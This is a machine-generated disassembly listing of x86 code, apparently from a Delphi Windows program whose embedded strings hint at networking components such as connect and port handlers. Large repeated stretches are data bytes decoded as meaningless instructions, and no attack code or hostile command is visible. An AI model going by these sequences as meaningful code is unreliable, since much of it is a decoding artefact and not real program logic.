loopne r-xdata
imul ebp [ edi + 0x6e ] 0x47e0a400
push ss
inc edx
add [ edi + ecx * 4 - 0x3773ffbf ] ch
inc edi
call 0x484821fd
xor al [ eax ]
xor al [ fs : eax ]
adc al 0xc5
add [ ebp - 0x1e2bffc0 ] cl
inc edi
inc edi
add [ eax - 0x17ffbe70 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x47 ] cl
add [ edx + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
jb r-xdata
popad
jo r-xdata
add [ eax ] ecx
pop es
inc ecx
push esp
push 0x64616572
adc edx [ ecx + ecx * 2 + 0x64 ]
dec ebp
add [ esi - 0x1e ] bl
dec edi
jne r-xdata
inc edi
add [ eax ] bl
add [ eax ] eax
add [ eax ] dh
mov esi 0x1ae00047
inc edx
add ah ch
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
bound ebp [ edi + 0x75 ]
outsb
inc ebx
outsd
outsb
sub_47e2cf
cld
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d0a001d ] al
popad
jo r-xdata
or [ edi + 0x6e ] ecx
inc ebp
js r-xdata
push eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140020 ] al
outsb
dec edi
jne r-xdata
arpl [ ebp + 0x74 ] si
fsubr st0
inc edi
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001f ] al
outsb
dec edi
jne r-xdata
fsubr st0
fsubr st0
inc edi
add [ eax - 0x3bffb816 ] cl
0x10047 0x0
jmp r-xdata
bound ebp [ edi + 0x75 ]
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax + edx * 4 + 0x2c ] si
in al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x47 ] ch
add [ eax + eax - 0x20100000 ] al
inc edi
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x15 ] bh
inc edi
add [ eax + 0x10 ] dh
inc edx
add [ edi ] ah
inc edi
add [ eax + 0x200047d0 ] dl
cmpsd [ esi ] [ edi ]
inc edi
add [ edi ] bl
inc edi
add al bl
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
in al 0x47
bound ebp [ edi + 0x75 ]
outsb
inc esp
popad
je r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr st0
inc edi
add [ eax - 0x3ffb816 ] dh
0x10047 0x0
adc [ eax ] al
push eax
in eax 0x47
push esp
insb
outsb
je r-xdata
push edi
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
js r-xdata
je r-xdata
push 0x486b6365
outsd
jae r-xdata
sbb al [ edx ]
loopne r-xdata
inc edx
add al bh
inc edi
add ah bl
call 0xffffffffe8cbe5d9
inc edi
add ah dh
call 0xffffffffcdffe5e1
inc edi
add [ eax ] al
leave
inc edi
add [ eax ] bl

inc edi
add [ esi + edx * 2 + 0x56ec0047 ] dh
inc edi
add [ edi + edx * 2 ] bl
add [ 0x726f5056 ] eax
je r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
in eax 0x47
add [ eax ] ch
inc edi
push eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
in eax 0x47
add [ eax + 0x10940047 ] ah
inc eax
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ eax - 0x1b ] dl
push ebx
je r-xdata
inc edi
add [ eax + ecx * 8 + 0x17d00047 ] ch
call 0xffffffffac48276f
pop [ ecx ]
mov eax cs
imul ebp [ esi + 0x67 ] 0x50560501
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ eax + ecx ] al
pop es
inc ecx
push esp
push 0x64616572
adc edx [ ecx + ecx * 2 + 0x64 ]
dec ebp
popad
jo r-xdata
inc edx
add al cl
sbb [ edx ] al
clc
inc edi
add al dl
inc edi
imul ebp [ esi + 0x67 ] 0x47e0a400
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ eax + edx - 0x1aafffc0 ] dl
pop ss
lodsb [ esi ]
enter 0x47 0xd0
push es
add [ eax ] eax
add [ eax - 0x1fffb81f ] cl
sbb al [ edx ]
in al dx
push eax
outsd
jb r-xdata
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
add ah ch
push esp
push 0x64616572
add cl [ ecx ]
inc ecx
dec eax
outsd
jae r-xdata
push ss
inc edx
add [ edi + ecx * 4 - 0x3773ffbf ] ch
call 0x48482579
push eax
outsd
jb r-xdata
xor al [ eax ]
xor al [ fs : eax ]
adc al 0xc5
inc edi
add [ eax - 0x17ffbe70 ] dl
dec eax
push es
push ebx
je r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax * 8 - 0x6f6fffb9 ] dl
imul ebp [ esi + 0x67 ] 0x48560501
outsd
jae r-xdata
inc ecx
add al ch
push es
sub_47e2fc
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or [ edi + 0x6e ] ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : eax - 0x1f ] si
inc edi
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11001e ] al
outsb
dec edi
jne r-xdata
dec edi
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ esp + ebx * 8 - 0x20 ] si
inc edi
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
bound ebp [ edi + 0x75 ]
outsb
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + ebx * 8 - 0x20 ] si
inc edi
add [ edx + ebp * 8 - 0x151fffb9 ] bl
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090011 ] al
outsb
inc ebp
js r-xdata
jmp r-xdata
bound ebp [ edi + 0x75 ]
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax + edx * 4 + 0x2c ] si
in al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x47 ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140020 ] al
outsb
dec edi
jne r-xdata
arpl [ ebp + 0x74 ] si
fsubr st0
inc edi
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001f ] al
outsb
dec edi
jne r-xdata
popad
jo r-xdata
add [ eax + eax - 0x20100000 ] al
inc edi
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x15 ] bh
inc edi
add [ eax + 0x10 ] dh
inc edx
add [ edi ] ah
inc edi
add [ eax + 0x200047d0 ] dl
cmpsd [ esi ] [ edi ]
inc edi
add [ edi ] bl
inc edi
add al bl
iretd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
in al 0x47
bound ebp [ edi + 0x75 ]
outsb
inc esp
popad
je r-xdata
adc [ eax ] al
push eax
in eax 0x47
push esp
insb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr st0
inc edi
add [ eax - 0x3ffb816 ] dh
0x10047 0x0
push edi
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
js r-xdata
je r-xdata
push 0x486b6365
outsd
jae r-xdata
sbb al [ edx ]
loopne r-xdata
inc edx
add al bh
inc edi
add ah bl
call 0xffffffffe8cbe5d9
inc edi
add ah dh
call 0xffffffffcdffe5e1
inc edi
add [ eax ] al
leave
inc edi
add [ eax ] bl

inc edi
add [ esi + edx * 2 + 0x56ec0047 ] dh
inc edi
add [ edi + edx * 2 ] bl
add [ 0x726f5056 ] eax
je r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
in eax 0x47
add [ eax ] ch
inc edi
push eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
in eax 0x47
add [ eax + 0x10940047 ] ah
inc eax
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ eax - 0x1b ] dl
push ebx
je r-xdata
inc edi
add [ eax + ecx * 8 + 0x17d00047 ] ch
call 0xffffffffac48276f
pop [ ecx ]
mov eax cs
imul ebp [ esi + 0x67 ] 0x50560501
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ eax + ecx ] al
pop es
inc ecx
push esp
push 0x64616572
adc edx [ ecx + ecx * 2 + 0x64 ]
dec ebp
popad
jo r-xdata
inc edx
add al cl
sbb [ edx ] al
clc
inc edi
add al dl
inc edi
imul ebp [ esi + 0x67 ] 0x47e0a400
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ eax + edx - 0x1aafffc0 ] dl
pop ss
lodsb [ esi ]
enter 0x47 0xd0
push es
add [ eax ] eax
add [ eax - 0x1fffb81f ] cl
sbb al [ edx ]
in al dx
push eax
outsd
jb r-xdata
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
add ah ch
push esp
push 0x64616572
add cl [ ecx ]
inc ecx
dec eax
outsd
jae r-xdata
push ss
inc edx
add [ edi + ecx * 4 - 0x3773ffbf ] ch
call 0x48482579
push eax
outsd
jb r-xdata
xor al [ eax ]
xor al [ fs : eax ]
adc al 0xc5
inc edi
add [ eax - 0x17ffbe70 ] dl
dec eax
push es
push ebx
je r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax * 8 - 0x6f6fffb9 ] dl
imul ebp [ esi + 0x67 ] 0x48560501
outsd
jae r-xdata
inc ecx
add al ch
push es
sub_47e399
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
or al 0x4f
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ esp + ebx * 8 - 0x20 ] si
inc edi
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f140020 ] al
outsb
dec edi
jne r-xdata
jmp r-xdata
bound ebp [ edi + 0x75 ]
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax + edx * 4 + 0x2c ] si
in al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x47 ] ch
add [ eax + eax - 0x20100000 ] al
inc edi
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x15 ] bh
inc edi
add [ eax + 0x10 ] dh
inc edx
add [ edi ] ah
inc edi
add [ eax + 0x200047d0 ] dl
cmpsd [ esi ] [ edi ]
inc edi
add [ edi ] bl
inc edi
add al bl
iretd
popad
jo r-xdata
adc [ eax ] al
push eax
in eax 0x47
push esp
insb
outsb
je r-xdata
push edi
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
js r-xdata
je r-xdata
push 0x486b6365
outsd
jae r-xdata
sbb al [ edx ]
loopne r-xdata
inc edx
add al bh
inc edi
add ah bl
call 0xffffffffe8cbe5d9
inc edi
add ah dh
call 0xffffffffcdffe5e1
inc edi
add [ eax ] al
leave
inc edi
add [ eax ] bl

inc edi
add [ esi + edx * 2 + 0x56ec0047 ] dh
inc edi
add [ edi + edx * 2 ] bl
add [ 0x726f5056 ] eax
je r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
in eax 0x47
add [ eax ] ch
inc edi
push eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
in eax 0x47
add [ eax + 0x10940047 ] ah
inc eax
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ eax - 0x1b ] dl
push ebx
je r-xdata
inc edi
add [ eax + ecx * 8 + 0x17d00047 ] ch
call 0xffffffffac48276f
pop [ ecx ]
mov eax cs
imul ebp [ esi + 0x67 ] 0x50560501
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ eax + ecx ] al
pop es
inc ecx
push esp
push 0x64616572
adc edx [ ecx + ecx * 2 + 0x64 ]
dec ebp
popad
jo r-xdata
inc edx
add al cl
sbb [ edx ] al
clc
inc edi
add al dl
inc edi
imul ebp [ esi + 0x67 ] 0x47e0a400
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ eax + edx - 0x1aafffc0 ] dl
pop ss
lodsb [ esi ]
enter 0x47 0xd0
push es
add [ eax ] eax
add [ eax - 0x1fffb81f ] cl
sbb al [ edx ]
in al dx
push eax
outsd
jb r-xdata
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
add ah ch
push esp
push 0x64616572
add cl [ ecx ]
inc ecx
dec eax
outsd
jae r-xdata
push ss
inc edx
add [ edi + ecx * 4 - 0x3773ffbf ] ch
call 0x48482579
push eax
outsd
jb r-xdata
xor al [ eax ]
xor al [ fs : eax ]
adc al 0xc5
inc edi
add [ eax - 0x17ffbe70 ] dl
dec eax
push es
push ebx
je r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax * 8 - 0x6f6fffb9 ] dl
imul ebp [ esi + 0x67 ] 0x48560501
outsd
jae r-xdata
inc ecx
add al ch
push es
sub_47e649
cld
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edi ] 0x0
add [ eax ] al
sbb eax 0x614d0a00
jo r-xdata
clc
push eax
outsd
jb r-xdata
push edi
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
js r-xdata
mov eax eax
mov ah 0xe6
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
out 0x47 eax
add [ eax ] ch
add [ eax ] eax
add [ 0x1ae00047 ] al
inc edx
add ah ch
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax * 8 - 0x6f6fffb9 ] dl
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 - 0x3773ffbf ] ch
inc edi
add [ eax + ecx * 8 + 0x17d00047 ] ch
inc edx
add al cl
sbb [ edx ] al
sbb al [ edx ]
loopne r-xdata
inc edx
add al bh
inc edi
add ah bl
call 0xffffffffe8cbe73d
inc edi
add ah dh
call 0xffffffffcdffe745
inc edi
add [ eax ] al
leave
inc edi
add [ eax ] bl

inc edi
add [ esi + edx * 2 + 0x56ec0047 ] dh
inc edi
add [ edi + edx * 2 ] bl
sub_47e7ab
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0022 ] al
outsb
inc ebx
push 0x486b6365
outsd
jae r-xdata
fmul [ ebx + 0x10483 ]
push eax
outsd
jb r-xdata
add bh bh
xchg ebx eax
add [ ecx ] al
add [ eax ] al
pop ebx
retn
add [ eax ] eax
out 0x48 al
add [ edi + 0x530000fe ] dl
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47c438
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47e7d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47c438
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47e884
push ebx
push esi
push edi
mov esi edx
mov edx esi
call sub_47c620
mov edi esi
mov ebx [ edi + 0x70 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ edi + 0x70 ]
mov edx [ eax ]
call [ edx + 0x58 ]
sub_47e8b0
push ebx
push esi
mov esi edx
cmp [ eax + 0x112 ] 0x0
je r-xdata
mov eax [ esi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
pop esi
pop ebx
retn
mov ebx eax
mov edx esi
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_47e8f4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47ea77
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
xor eax eax
push ebp
push sub_47ea55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x7c ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0x8 ]
mov eax [ esi + 0x70 ]
mov eax [ eax + 0x7c ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x14 ] eax
mov ebx [ esi + 0x74 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_418854
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_418854
push 0x0
push 0xfffffffe
mov edx [ esi + 0x74 ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edi [ eax ]
call [ edi + 0x50 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ea5c
mov ebx [ ebp - 0x8 ]
mov eax [ ebx + 0x70 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_418a0c
inc eax
jle r-xdata
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_418a0c
inc eax
jle r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_478c48
mov edx [ ebp - 0x18 ]
lea eax [ esi + 0x78 ]
call sub_404100
mov eax [ esi + 0x78 ]
call sub_40436c
test eax eax
jle r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ esi + 0x70 ]
call sub_478c48
mov edx [ ebp - 0x1c ]
lea eax [ esi + 0x78 ]
call sub_404100
mov eax [ esi + 0x78 ]
call sub_40436c
test eax eax
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx [ esi + 0x78 ]
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_47eb18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47a890
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x74 ] eax
mov [ esi + 0x7c ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47eb78
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x74 ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47a928
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_47eba8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47df10
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push j_sub_4038a4#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xfc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xf8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47ec48
add [ eax ] eax
add [ eax ] al
push 0x54004072
in al dx
inc edi
add [ ebx - 0x3aa7438 ] cl
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47ec78
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47e7d4
mov [ esi + 0x118 ] 0xffffffff
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
mov edx 0x17
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esi + 0xfc ] 0x17
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47ecd8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x122 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
sub_47ed04
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47ee32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_40436c
test eax eax
jle r-xdata
lea eax [ ebp - 0xc ]
call sub_4040ac
lea eax [ ebp - 0x10 ]
call sub_4040ac
mov ebx edi
mov eax edi
call sub_40436c
mov esi eax
add esi ebx
jmp r-xdata
cmp esi ebx
jbe r-xdata
mov ecx ebx
mov eax edi
sub ecx eax
lea edx [ ebp - 0xc ]
xchg edx eax
call sub_40419c
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp esi ebx
jbe r-xdata
sub al 0x9
je r-xdata
mov ecx esi
sub ecx ebx
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_40419c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4081a4
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
call sub_404144
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_408170
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_404144
jmp r-xdata
mov al [ ebx ]
sub al 0x9
je r-xdata
sub al 0x17
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x70 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x70 ]
mov edx [ ebx + 0xdc ]
mov eax [ ebp - 0x10 ]
call sub_408400
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ee39
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4040d0
retn
inc ebx
sub al 0x17
je r-xdata
sub al 0x1a
jne r-xdata
sub al 0x1a
je r-xdata
inc ebx
sub_47ee40
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47f05e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47df10
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0xfc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0xf8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov eax [ eax + 0x118 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x118 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
push ebp
push j_sub_4038a4#6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov cl 0x1
xor edx edx
call sub_479b60
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_408120
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_47ed04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
